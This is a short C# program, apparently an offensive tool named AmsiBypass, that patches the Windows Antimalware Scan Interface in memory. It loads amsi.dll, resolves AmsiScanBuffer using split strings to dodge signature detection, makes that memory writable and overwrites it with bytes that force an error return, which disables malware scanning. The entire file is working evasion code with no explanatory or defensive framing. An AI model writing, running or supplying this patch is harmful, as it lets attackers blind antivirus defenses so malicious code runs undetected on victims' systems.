using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Runtime.InteropServices;

namespace AmsiBypass
{
    class Win32
    {
        [DllImport("kernel32")]
        public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        [DllImport("kernel32")]
        public static extern IntPtr LoadLibrary(string name);

        [DllImport("kernel32")]
        public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
    }
    class Program
    {
       
        static byte[] x64 = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };

        static void Main(string[] args)
        {
            try
            {
                var lib = Win32.LoadLibrary("am" + "si.dll");
                var addr = Win32.GetProcAddress(lib, "A" + "msi" + "Scan" + "Buffer");
                uint oldProtect;

                Win32.VirtualProtect(addr, (UIntPtr)x64.Length, 0x40, out oldProtect);

                for (int i = 0; i < x64.Length; i++)
                {
                    Marshal.WriteByte(addr + i, x64[i]);
                }

                Console.WriteLine("[*] AMSI Patched");
            }
            catch (Exception e)
            {
                Console.WriteLine("[x] {0}", e.Message);
                Console.WriteLine("[x] {0}", e.InnerException);
            }
        }
    }
}
